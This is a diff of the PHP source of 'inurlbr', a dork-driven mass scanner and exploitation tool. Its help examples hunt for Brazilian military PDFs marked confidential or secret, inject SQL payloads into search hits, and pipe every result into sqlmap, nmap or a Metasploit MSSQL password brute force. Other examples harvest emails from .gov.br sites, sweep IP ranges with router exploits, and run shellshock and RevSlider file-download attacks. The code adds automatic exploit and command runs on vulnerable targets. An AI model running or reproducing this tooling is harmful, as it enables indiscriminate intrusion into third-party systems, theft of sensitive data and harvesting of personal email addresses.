+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
+   
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'index of wp-content/uploads' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6,2,4 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'Index of /wp-content/uploads'{$_SESSION["c0"]}
+   
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(confidencial) ext:pdf' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 -t 2 --exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'confidencial'{$_SESSION["c0"]}
+   
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(secreto) ext:pdf' {$_SESSION["c1"]}-s save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'secreto'{$_SESSION["c0"]}        
+  
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\"{$_SESSION["c0"]}
+   
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'.new.php?new id' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6,7,2,3 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'::EXPLOIT-SUCESS::'{$_SESSION["c0"]}
+  
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'new.php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}teste.txt  {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27  {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
+   
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:pt inurl:aspx (id|q)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}bruteforce.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$_SESSION["c9"]}_TARGETIP_ {$_SESSION["c2"]}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$_SESSION["c0"]}
+  
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:id & inurl:php' {$_SESSION["c1"]}-s {$_SESSION["c2"]}get.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'python ../sqlmap/sqlmap.py -u \"{$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c2"]}\" --dbs'{$_SESSION["c0"]}
+  
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:index.php?id=' {$_SESSION["c1"]}-q 1,2,10 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"'?´0x27'\" {$_SESSION["c1"]}-s {$_SESSION["c2"]}report.txt {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap -Pn -p 1-8080 --script http-enum --open {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
+ 
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email' {$_SESSION["c1"]}-s {$_SESSION["c2"]}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
+  
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}emails.txt {$_SESSION["c1"]}-m{$_SESSION["c0"]}
+  
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}-u{$_SESSION["c0"]}
+ 
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.bo' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]} 
+ 
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.uk' {$_SESSION["c1"]}-s {$_SESSION["c2"]}uk.txt {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$_SESSION["c0"]}
+ 
+./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]}
+ 
+./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}sqli.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6  {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'   {$_SESSION["c0"]}
+  
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:\"cgi-bin/login.cgi\"' {$_SESSION["c1"]}-s {$_SESSION["c2"]}cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_' {$_SESSION["c0"]} 
+ 
+./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]}
+  
+./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
+  
+./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?pass=1234\" {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello! admin</title>'{$_SESSION["c0"]}
+  
+./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find_valid_cod-200.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}5{$_SESSION["c0"]}
+  
+./inurlbr.php {$_SESSION["c1"]}--range {$_SESSION["c2"]}'200.20.10.1,200.20.10.255' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php roteador.php _TARGETIP_'  {$_SESSION["c0"]}
+ 
+./inurlbr.php {$_SESSION["c1"]}--range-rad {$_SESSION["c2"]}'1500' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php roteador.php _TARGETIP_'  {$_SESSION["c0"]}
+ 
+./inurlbr.php {$_SESSION["c1"]}--dork-rad {$_SESSION["c2"]}'20' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\" {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]}
+ 
+./inurlbr.php {$_SESSION["c1"]}--dork-rad {$_SESSION["c2"]}'20' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\" {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]} --pr
+ 
+./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksCGI.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]} --pr --shellshock
+ 
+./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks_Wordpress_revslider.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}'xpls_Arbitrary_File_Download.txt' {$_SESSION["c0"]} 
    {$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
   
-  {$_SESSION["c1"]}0x{$_SESSION["c16"]}It it also useful to know the full path to the PHP binary on your computer. {$_SESSION["c0"]}
-  {$_SESSION["c1"]}0x{$_SESSION["c16"]}There are several ways of finding out. For Ubuntu and Mac OS X the path is '/usr/bin/php'.{$_SESSION["c0"]}
+  {$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}It it also useful to know the full path to the PHP binary on your computer. {$_SESSION["c0"]}
+  {$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}There are several ways of finding out. For Ubuntu and Mac OS X the path is '/usr/bin/php'.{$_SESSION["c0"]}
 
   googleinurl@inurlbr:~$ which php 
   /usr/bin/php 
@@ -656,23 +1137,24 @@ function __bannerLogo() {
 {$vis}    \   / {$_SESSION["c1"]}   01     C  .CN. C     01       C     0101dC9      01        {$_SESSION["c3"]}  01'''bg.   0101dC9   
 {$vis}     \ /  {$_SESSION["c1"]}   01     C   .01.C     01       C     01  YC.      01      , {$_SESSION["c12"]}  01    .Y   01  YC.   
 {$vis}     /=\  {$_SESSION["c1"]}   01     C     Y01     YC.     ,C     01   .Cb.    01     ,C {$_SESSION["c3"]}  01    ,9   01   .Cb. 
-{$vis}    [___] {$_SESSION["c1"]} .J01L. .JCL.    YC      .b0101d'.   .J01L. .J01. .J01010101C {$_SESSION["c12"]}.J0101Cd9  .J01L. .J01./ {$_SESSION["c1"]}2.0\n
+{$vis}    [___] {$_SESSION["c1"]} .J01L. .JCL.    YC      .b0101d'.   .J01L. .J01. .J01010101C {$_SESSION["c12"]}.J0101Cd9  .J01L. .J01./ {$_SESSION["c1"]}2.1\n
 {$_SESSION["c1"]}__[ ! ] Neither war between hackers, nor peace for the system.
-{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}http://blog.inurl.com.br
-{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}http://fb.com/InurlBrasil
-{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}http://twitter.com/@googleinurl{$_SESSION["c0"]}
-{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}http://github.com/googleinurl{$_SESSION["c0"]}
-{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}Current PHP version::[ {$_SESSION["c1"]}" . phpversion() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
-{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}Current script owner::[ {$_SESSION["c1"]}" . get_current_user() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
-{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}Current uname::[ {$_SESSION["c1"]}" . php_uname() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
-{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}Current pwd::[ {$_SESSION["c1"]}" . getcwd() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
-{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c2"]}Help: php inurlbr.php --help{$_SESSION["c0"]}
+{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://blog.inurl.com.br
+{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://fb.com/InurlBrasil
+{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://twitter.com/@googleinurl{$_SESSION["c0"]}
+{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://github.com/googleinurl{$_SESSION["c0"]}
+{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current PHP version::[ {$_SESSION["c1"]}" . phpversion() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
+{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current script owner::[ {$_SESSION["c1"]}" . get_current_user() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
+{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current uname::[ {$_SESSION["c1"]}" . php_uname() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
+{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current pwd::[ {$_SESSION["c1"]}" . getcwd() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
+{$_SESSION["c1"]}__[ ! ] {$_SESSION["c2"]}Help: php inurlbr.php --help{$_SESSION["c0"]}
 {$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
 ");
 }
 
 ################################################################################
 #CHANGE PROXY FUNCTION IN TIME##################################################
+################################################################################
 
 function __timeValueChangeProxy($sec = NULL) {
 
@@ -692,6 +1174,7 @@ function __timeSecChangeProxy($list_proxy) {
 
 ################################################################################
 #GET STATUS HTTP URL############################################################
+################################################################################
 
 function __getStatusURL($url) {
 
@@ -714,6 +1197,7 @@ function __getStatusURL($url) {
 
 ################################################################################
 #BEEP ##########################################################################
+################################################################################
 
 function __cli_beep() {
 
@@ -722,6 +1206,7 @@ function __cli_beep() {
 
 ################################################################################
 #SETUP TO RUN COMMANDS IN ID####################################################
+################################################################################
 
 function __configExploitsExec($id, $alvo) {
 
@@ -744,6 +1229,10 @@ function __configExploitsExec($id, $alvo) {
     }
 }
 
+################################################################################
+#LIST COMMANDS FILE exploits.conf###############################################
+################################################################################
+
 function __configExploitsList($op = NULL) {
 
     $resultadoURL = array_unique(array_filter(explode("\n", file_get_contents($_SESSION['config']['file_exploit_conf']))));
@@ -764,6 +1253,10 @@ function __configExploitsList($op = NULL) {
     }
 }
 
+################################################################################
+#INSERT VALUES COMMANDS FILE exploits.conf######################################
+################################################################################
+
 function __configExploitsADD($valor = NULL) {
 
     if (!is_null($valor) && preg_match("(([a-zA-Z0-9-].*)(::.*)([a-zA-Z0-9-]))", $valor)) {
@@ -775,7 +1268,7 @@ function __configExploitsADD($valor = NULL) {
         echo "\n     |STATUS: ADDED VALUE WITH SUCCESS!";
         echo "\n     |VALUE: {$valor}";
         echo "\n-----------------------------------------------------------------------------------------------------------------------\n";
-        __saveValue($_SESSION['config']['file_exploit_conf'], $valor, 2);
+        __saveValue($_SESSION['config']['file_exploit_conf'], __crypt($valor), 2);
         print_r(__configExploitsList());
         __getOut("{$_SESSION['config']['line']}\n");
     } else {
@@ -786,6 +1279,7 @@ function __configExploitsADD($valor = NULL) {
 
 ################################################################################
 #CHECK CMS######################################################################
+################################################################################
 
 function __SimpleCheckCMS($html) {
 
@@ -828,18 +1322,35 @@ function __SimpleCheckCMS($html) {
 
 ################################################################################
 #REPLACE THE SECURITIES URL#####################################################
+################################################################################
 
 function __replace($exploit, $url) {
 
-    $exploit_ = strstr($_SESSION['config']['replace'], '[INURL]') ? $exploit : __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
+    $exploit_ = strstr($_SESSION['config']['replace'], '[INURL]') ?
+            $exploit :
+            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
     $exploit = explode("[INURL]", $exploit_);
-    $exploit[0] = (isset($exploit[0]) && !is_null($exploit[0])) ? $exploit[0] : __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
-    $exploit[1] = (isset($exploit[0]) && !is_null($exploit[1])) ? $exploit[1] : __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
+    $exploit[0] = (isset($exploit[0]) && !is_null($exploit[0])) ?
+            $exploit[0] :
+            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
+    $exploit[1] = (isset($exploit[0]) && !is_null($exploit[1])) ?
+            $exploit[1] :
+            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
     return str_replace($exploit[0], $exploit[1], $url);
 }
 
 ################################################################################
+#REMOVE VALUE URL###############################################################
+################################################################################
+
+function __remove($value, $url) {
+
+    return str_replace($value, NULL, $url);
+}
+
+################################################################################
 #VALID MENU OPTIONS#############################################################
+################################################################################
 
 function __validateOptions($opArray, $validar, $op = NULL) {
 
@@ -867,6 +1378,7 @@ function __validateOptions($opArray, $validar, $op = NULL) {
 
 ################################################################################
 #VALIDATE OPERATING SYSTEM AND COLOR SYSTEM#####################################
+################################################################################
 
 function __OS() {
 
@@ -886,7 +1398,7 @@ function __OS() {
         $_SESSION["c1"] = "\033[1;37m";   // WHITE
         $_SESSION["c2"] = "\033[1;33m";   // YELLOW
         $_SESSION["c3"] = "\033[1;31m";   // RED LIGHT
-        $_SESSION["c4"] = "\033[0;32m";   // GREEN
+        $_SESSION["c4"] = "\033[32m";   // GREEN 
         $_SESSION["c5"] = "\033[1;32m";   // GREEN LIGHT
         $_SESSION["c6"] = "\033[0;35m";   // PURPLE
         $_SESSION["c7"] = "\033[1;30m";   // DARK GREY
@@ -904,15 +1416,19 @@ function __OS() {
 
 ################################################################################
 #SAVE URL VULNERABLE  COMMAND ECHO >> FILE######################################
+################################################################################
 
 function __saveValue($arquivo, $valor, $op = NULL) {
 
-    echo ($op == 1) ? "\n{$_SESSION["c1"]}|_[ + ]{$_SESSION["c7"]} VALUE SAVED IN THE FILE::{$_SESSION["c9"]} {$arquivo}{$_SESSION["c0"]}" : NULL;
-    file_put_contents(($op == 2) ? $arquivo : $_SESSION['config']['out_put_paste'] . $arquivo, "{$valor}\n", FILE_APPEND);
+    $path = !not_isnull_empty($_SESSION['config']['save-as']) ? $_SESSION['config']['out_put_paste'] : NULL;
+    echo ($op == 1) ?
+            "\n{$_SESSION["c1"]}|_[ + ]{$_SESSION["c7"]} VALUE SAVED IN THE FILE::{$_SESSION["c9"]} {$arquivo}{$_SESSION["c0"]}" : NULL;
+    file_put_contents(($op == 2) ? $arquivo : $path . $arquivo, "{$valor}\n", FILE_APPEND);
 }
 
 ################################################################################
 #CAPTURE ID KEY TO SEARCH LYCOS MAKE############################################
+################################################################################
 
 function __getIdSearchLycos($html) {
 
@@ -923,11 +1439,12 @@ function __getIdSearchLycos($html) {
 
 ################################################################################
 #RENEW IP NETWORK TOR###########################################################
+################################################################################
 
 function __renewTOR() {
 
     system("[ -z 'pidof tor' ] || pidof tor | xargs sudo kill -HUP;");
-    $request__ = __request_info($curl = curl_init(), 'http://dynupdate.no-ip.com/ip.php', $_SESSION["config"]["proxy"]);
+    $request__ = __request_info('http://dynupdate.no-ip.com/ip.php', $_SESSION["config"]["proxy"]);
     __plus();
     echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ IP NETWORK TOR RENEWED ]::: {$_SESSION["c1"]}[ {$request__['corpo'] } ]\n{$_SESSION["c0"]}";
     /* https://pt.wikipedia.org/wiki/Pidof
@@ -945,6 +1462,7 @@ function __renewTOR() {
 
 ################################################################################
 #This function will validate emails#############################################
+################################################################################
 
 function __validateEmail($email) {
 
@@ -959,6 +1477,7 @@ function __validateEmail($email) {
 
 ################################################################################
 #This function will validate URLS###############################################
+################################################################################
 
 function __validateURL($url) {
 
@@ -971,6 +1490,7 @@ function __validateURL($url) {
 
 ################################################################################
 #This function will filter custom values########################################
+################################################################################
 
 function __extractRegCustom($html, $url_) {
 
@@ -979,7 +1499,7 @@ function __extractRegCustom($html, $url_) {
     preg_match_all("#\b{$_SESSION['config']['regexp-filter']}#i", $html, $matches);
 
     echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
-    echo "{$_SESSION["c1"]} |_0xURL {$_SESSION["c0"]}=>{$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";
+    echo "{$_SESSION["c1"]} |_[ URL ] {$_SESSION["c0"]}=>{$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";
 
     $matches_ = array_filter(array_unique(array_unique($matches[0])));
     foreach ($matches_ as $valor) {
@@ -999,6 +1519,26 @@ function __extractRegCustom($html, $url_) {
 
 ################################################################################
 #This function will filter and mail each url####################################
+################################################################################
+
+function __filterEmailif($resultados) {
+
+    if (is_array($resultados)) {
+        echo "{$_SESSION["c1"]}|_[ ! ][ INFO ]{$_SESSION["c16"]}[ FILTERING VALUE ]::{$_SESSION["c1"]}[ {$_SESSION["config"]['ifemail']} ]{$_SESSION["c0"]}\n";
+        foreach ($resultados as $value) {
+
+            $temp[] = (strstr($value, $_SESSION['config']['ifemail']) ? $value : NULL);
+        }
+
+        return array_unique(array_filter($temp));
+    }
+
+    RETURN FALSE;
+}
+
+################################################################################
+#This function extract emails###################################################
+################################################################################
 
 function __extractEmail($html, $url_) {
 
@@ -1006,14 +1546,18 @@ function __extractEmail($html, $url_) {
     __plus();
     preg_match_all('/([\w\d\.\-\_]+)@([\w\d\.\_\-]+)/mi', $html, $matches);
     echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
-    echo "{$_SESSION["c1"]} |_0xURL {$_SESSION["c0"]}=>{$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";
+    echo "{$_SESSION["c1"]}|_[ ! ][ INFO ][URL] :: {$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";
 
-    $matches_ = array_filter(array_unique(array_unique($matches[0])));
+    $_matches = array_filter(array_unique(array_unique($matches[0])));
+    $matches_ = (not_isnull_empty($_SESSION['config']['ifemail']) ? __filterEmailif($_matches) : $_matches);
+
     foreach ($matches_ as $valor) {
 
         if (__validateEmail($valor)) {
 
-            echo "{$_SESSION["c1"]}|_[ + ]{$_SESSION["c0"]}[\033[01;31m {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]- {$valor} " . (filter_var($valor, FILTER_VALIDATE_EMAIL) ? "{$_SESSION["c14"]}[ OK ]{$_SESSION["c0"]}" : "{$_SESSION["c16"]}[ NO ]{$_SESSION["c0"]}") . "\n";
+            echo "{$_SESSION["c1"]}|_[ + ]{$_SESSION["c0"]}[\033[01;31m {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]- {$valor} "
+            . (filter_var($valor, FILTER_VALIDATE_EMAIL) ?
+                    "{$_SESSION["c14"]}[ OK ]{$_SESSION["c0"]}" : "{$_SESSION["c16"]}[ NO ]{$_SESSION["c0"]}") . "\n";
             (filter_var($valor, FILTER_VALIDATE_EMAIL) ? $_SESSION["config"]["resultado_valores"].="{$valor}\n" : NULL);
             __plus();
             (filter_var($valor, FILTER_VALIDATE_EMAIL) ? __saveValue($_SESSION["config"]["arquivo_output"], $valor) : NULL);
@@ -1027,6 +1571,7 @@ function __extractEmail($html, $url_) {
 
 ################################################################################
 #This function will filter urls each url########################################
+################################################################################
 
 function __extractURLs($html, $url_) {
 
@@ -1046,7 +1591,8 @@ function __extractURLs($html, $url_) {
 
         $valor = __filterURLTAG($valor);
         if (__validateURL($valor) && !__validateOptions($blacklist_, $valor, 1)) {
-            echo "{$_SESSION["c1"]}__[ + ]{$_SESSION["c0"]}[\033[01;31m {$_SESSION["config"]['cont_url']} {$_SESSION["c9"]}]- {$valor}{$_SESSION["c0"]}\n";
+            echo "{$_SESSION["c1"]}__[ + ]{$_SESSION["c0"]}[\033[01;31m {$_SESSION["config"]['cont_url']}"
+            . " {$_SESSION["c9"]}]- {$valor}{$_SESSION["c0"]}\n";
             $_SESSION["config"]["resultado_valores"].="{$valor}\n";
             __plus();
             __saveValue($_SESSION["config"]["arquivo_output"], $valor) . __plus();
@@ -1059,31 +1605,56 @@ function __extractURLs($html, $url_) {
 
 ################################################################################
 #This function removes the last regular expression ta###########################
+################################################################################
 
 function __filterURLTAG($valor = NULL) {
 
-    return(!is_null($valor)) ? str_replace('href="', '', str_replace('src="', '', str_replace('value="', '', $valor))) : NULL;
+    return(!is_null($valor)) ? str_replace('"', '', str_replace('href="', '', str_replace('src="', '', str_replace('value="', '', $valor)))) : NULL;
 }
 
 ################################################################################
 #Esta função irá formatar salvar urls concatenadas##############################
+################################################################################
 
 function __checkURLs($resultado, $url_) {
 
     __plus();
     $code = !is_null($_SESSION["config"]["ifcode"]) ? $_SESSION["config"]["ifcode"] : 200;
-    $valor = ($resultado == $code) ? "{$_SESSION["c4"]}" : NULL;
+    $valor = ($resultado['server']['http_code'] == $code) ? "{$_SESSION["c4"]}" : NULL;
+
     echo "\n{$_SESSION["c1"]}  |_[ INFO ]{$_SESSION["c0"]}[{$_SESSION["c1"]} {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]\n";
     echo "{$_SESSION["c1"]}  |_[ INFO ][URL] {$_SESSION["c0"]}::{$_SESSION["c9"]}{$valor} {$url_} {$_SESSION["c0"]}\n";
-    echo "{$_SESSION["c1"]}  |_[ INFO ][STATUS]::{$valor} {$resultado} {$_SESSION["c0"]}\n";
+    echo "{$_SESSION["c1"]}  |_[ INFO ][STATUS]::{$valor} {$resultado['server']['http_code']} {$_SESSION["c0"]}\n";
+
     __timeSec('delay');
     echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}";
     __plus();
 
+    $target_ = array('url_clean' => $url_, 'url_xpl' => $url_);
+
     if ($resultado == $code) {
+
         $_SESSION['config']['resultado_valores'].= "{$url_}\n";
         __saveValue($_SESSION["config"]["arquivo_output"], $url_) . __plus();
+        __plus();
+
+        (not_isnull_empty($_SESSION['config']['sub-file']) &&
+                is_array($_SESSION['config']['sub-file']) ? __subExecExploits($target_['url_xpl'], $_SESSION['config']['sub-file']) : NULL);
+        __plus();
+
+        (not_isnull_empty($_SESSION['config']['command-vul']) ? __command($_SESSION['config']['command-vul'], $target_) : NULL);
+        __plus();
+
